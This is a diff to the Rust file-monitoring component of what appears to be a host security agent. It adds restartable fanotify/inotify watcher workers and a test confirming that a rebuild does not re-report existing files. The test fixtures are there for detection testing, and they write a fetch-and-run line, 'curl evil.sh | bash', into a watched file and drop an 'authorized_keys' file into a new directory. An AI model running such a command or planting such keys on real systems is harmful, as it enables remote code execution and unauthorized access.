@@ -29,6 +29,7 @@ use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
 
 use crate::pb::AgentEvent;
 
+use super::liveness::{Stop, Worker};
 use super::{EventSink, username_of};
 
 /// OCSF File System Activity
@@ -113,14 +114,30 @@ pub fn spawn(agent_id: String, sink: EventSink, dirs: &[String]) -> io::Result<u
     // 自检目录随监控目标一起挂上，活性检测改写其中的文件确认通道活着（事件按路径认出、不上报）
     let canary = super::liveness::canary_dir();
     targets.extend(canary.map(str::to_string));
-    let watch = |sink: &EventSink| {
-        if let Some(dir) = canary {
-            super::liveness::spawn(sink.clone(), &super::liveness::FILES, move || {
-                super::liveness::probe_files(dir)
-            });
-        }
-    };
-    match fa_setup(&targets) {
+    let (worker, n) = start(&agent_id, &sink, &targets)?;
+    match canary {
+        // 静默重建走同一条路：重新 fanotify_init / inotify_init 并挂上全部目标。
+        // 新挂上的目标不补报已有文件（那是 backfill，只给运行中新出现的目录做），不会把整片目录当新建
+        Some(dir) => super::liveness::spawn(
+            sink.clone(),
+            &super::liveness::FILES,
+            move || super::liveness::probe_files(dir),
+            worker,
+            move || {
+                start(&agent_id, &sink, &targets)
+                    .map(|(w, _)| w)
+                    .map_err(|e| e.to_string())
+            },
+        ),
+        None => worker.detach(),
+    }
+    Ok(n)
+}
+
+/// 起一个监控实例：fanotify 优先，不行回落 inotify。返回实例与盯上的目录数
+fn start(agent_id: &str, sink: &EventSink, targets: &[String]) -> io::Result<(Worker, usize)> {
+    let (agent_id, sink) = (agent_id.to_string(), sink.clone());
+    match fa_setup(targets) {
         Ok((st, n)) => {
             eprintln!("文件监控: fanotify 递归盯 {n} 个目录（含进程上下文）");
             sink.capability(
@@ -128,25 +145,29 @@ pub fn spawn(agent_id: String, sink: EventSink, dirs: &[String]) -> io::Result<u
                 "fanotify",
                 if n > 0 { "active" } else { "degraded" },
             );
-            watch(&sink);
-            std::thread::spawn(move || {
-                fa_run(st, &agent_id, &sink);
-                sink.capability("files", "fanotify", "unavailable");
+            let worker = Worker::spawn(move |stop| {
+                fa_run(st, &agent_id, &sink, stop);
+                // 被叫停是重建，新实例会自报状态
+                if !stop.requested() {
+                    sink.capability("files", "fanotify", "unavailable");
+                }
             });
-            Ok(n)
+            Ok((worker, n))
         }
         Err(e) => {
             eprintln!("fanotify 不可用（{e}），回落 inotify 递归监控");
-            let (fd, watched) = ino_init(&targets)
+            let (fd, watched) = ino_init(targets)
                 .inspect_err(|_| sink.capability("files", "inotify", "unavailable"))?;
             let n = watched.len();
             sink.capability("files", "inotify", "degraded");
-            watch(&sink);
-            std::thread::spawn(move || {
-                ino_run(fd, watched, targets, &agent_id, &sink);
-                sink.capability("files", "inotify", "unavailable");
+            let targets = targets.to_vec();
+            let worker = Worker::spawn(move |stop| {
+                ino_run(fd, watched, targets, &agent_id, &sink, stop);
+                if !stop.requested() {
+                    sink.capability("files", "inotify", "unavailable");
+                }
             });
-            Ok(n)
+            Ok((worker, n))
         }
     }
 }
@@ -327,11 +348,17 @@ fn ino_run(
     roots: Vec<String>,
     agent_id: &str,
     sink: &EventSink,
+    stop: &Stop,
 ) {
     // 单条 inotify_event 最大 sizeof(event) + NAME_MAX + 1，缓冲区放宽裕些
     let mut buf = [0u8; 16384];
     let mut last_rescan = Instant::now();
     loop {
+        if stop.requested() {
+            // SAFETY: fd 由本函数独占（ino_init 打开后按值移交进来），关闭后立即 return，不会再用或重复关闭。
+            unsafe { libc::close(fd) };
+            return;
+        }
         let mut pfd = libc::pollfd {
             fd,
             events: libc::POLLIN,
@@ -778,10 +805,10 @@ fn fa_resolve(mounts: &mut HashMap<(i32, i32), RawFd>, fid: &Fid) -> Option<Stri
     })
 }
 
-fn fa_run(mut st: FaState, agent_id: &str, sink: &EventSink) {
+fn fa_run(mut st: FaState, agent_id: &str, sink: &EventSink, stop: &Stop) {
     let mut buf = [0u8; 65536];
     let mut last_rescan = Instant::now();
-    loop {
+    while !stop.requested() {
         // fd 是 FAN_NONBLOCK：先 poll 等事件再读，避免空转
         let mut pfd = libc::pollfd {
             fd: st.fd,
@@ -978,7 +1005,9 @@ mod tests {
 
         let (fd, watched) = ino_init(std::slice::from_ref(&dir_s)).unwrap();
         let (sink, mut rx) = test_sink();
-        std::thread::spawn(move || ino_run(fd, watched, vec![dir_s], "agent-t", &sink));
+        std::thread::spawn(move || {
+            ino_run(fd, watched, vec![dir_s], "agent-t", &sink, &Stop::default())
+        });
 
         std::fs::write(dir.join("evil.txt"), b"x").unwrap();
 
@@ -993,6 +1022,59 @@ mod tests {
         let _ = std::fs::remove_dir_all(&dir);
     }
 
+    /// 等一会儿，收下这段时间里上报的文件路径
+    fn paths_within(rx: &mut mpsc::Receiver<AgentEvent>, wait_ms: u64) -> Vec<String> {
+        std::thread::sleep(std::time::Duration::from_millis(wait_ms));
+        let mut out = Vec::new();
+        while let Ok(ev) = rx.try_recv() {
+            let v: serde_json::Value = serde_json::from_str(&ev.raw_json).unwrap();
+            out.push(v["file"]["path"].as_str().unwrap_or_default().to_string());
+        }
+        out
+    }
+
+    /// 静默重建：旧实例停干净再起新的，已有文件不当新建补报，重建后的改动只报一次。
+    /// 走 inotify：非 root 的 fanotify 能初始化却解析不了句柄，单测里收不到事件
+    #[test]
+    fn rebuild_replays_nothing() {
+        let dir = temp_root("rebuild");
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(dir.join("sub")).unwrap();
+        std::fs::write(dir.join("old"), b"x").unwrap();
+        std::fs::write(dir.join("sub").join("old"), b"x").unwrap();
+        let targets = vec![dir.to_str().unwrap().to_string()];
+        let (sink, mut rx) = test_sink();
+        let start = || {
+            let (fd, watched) = ino_init(&targets).unwrap();
+            let (targets, sink) = (targets.clone(), sink.clone());
+            Worker::spawn(move |stop| ino_run(fd, watched, targets, "agent-t", &sink, stop))
+        };
+
+        let first = start();
+        std::fs::write(dir.join("one"), b"1").unwrap();
+        let one = dir.join("one").to_str().unwrap().to_string();
+        let seen = paths_within(&mut rx, 300);
+        assert!(
+            !seen.is_empty() && seen.iter().all(|p| *p == one),
+            "{seen:?}"
+        );
+        let first_count = seen.len();
+
+        drop(first);
+        let second = start();
+        assert!(paths_within(&mut rx, 300).is_empty(), "重建不补报已有文件");
+
+        std::fs::write(dir.join("two"), b"2").unwrap();
+        let two = dir.join("two").to_str().unwrap().to_string();
+        let seen = paths_within(&mut rx, 300);
+        assert!(seen.iter().all(|p| *p == two), "{seen:?}");
+        // 同样一次写入，条数与重建前一样：新旧实例并存会报两遍
+        assert_eq!(seen.len(), first_count, "{seen:?}");
+
+        drop(second);
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
     #[test]
     fn watch_picks_up_new_subdir() {
         let dir = temp_root("dyn");
@@ -1002,7 +1084,9 @@ mod tests {
 
         let (fd, watched) = ino_init(std::slice::from_ref(&dir_s)).unwrap();
         let (sink, mut rx) = test_sink();
-        std::thread::spawn(move || ino_run(fd, watched, vec![dir_s], "agent-t", &sink));
+        std::thread::spawn(move || {
+            ino_run(fd, watched, vec![dir_s], "agent-t", &sink, &Stop::default())
+        });
 
         // 运行中新建的子目录应被动态补挂；稍等事件循环处理完再写文件
         std::fs::create_dir(dir.join("sub")).unwrap();
@@ -1034,7 +1118,9 @@ mod tests {
 
         let (fd, watched) = ino_init(&targets).unwrap();
         let (sink, mut rx) = test_sink();
-        std::thread::spawn(move || ino_run(fd, watched, targets, "agent-t", &sink));
+        std::thread::spawn(move || {
+            ino_run(fd, watched, targets, "agent-t", &sink, &Stop::default())
+        });
 
         std::fs::create_dir(&late).unwrap();
         let payload = late.join("authorized_keys");
@@ -1062,7 +1148,9 @@ mod tests {
 
         let (fd, watched) = ino_init(&targets).unwrap();
         let (sink, mut rx) = test_sink();
-        std::thread::spawn(move || ino_run(fd, watched, targets, "agent-t", &sink));
+        std::thread::spawn(move || {
+            ino_run(fd, watched, targets, "agent-t", &sink, &Stop::default())
+        });
 
         std::fs::create_dir(&late).unwrap();
         std::thread::sleep(TARGET_RESCAN_INTERVAL * 3);
@@ -1160,7 +1248,7 @@ mod tests {
         let (fd, watched) = ino_init(std::slice::from_ref(&file_s)).unwrap();
         let (sink, mut rx) = test_sink();
         let roots = vec![file_s.clone()];
-        std::thread::spawn(move || ino_run(fd, watched, roots, "agent-t", &sink));
+        std::thread::spawn(move || ino_run(fd, watched, roots, "agent-t", &sink, &Stop::default()));
 
         std::fs::write(&file, b"curl evil.sh | bash").unwrap();
 
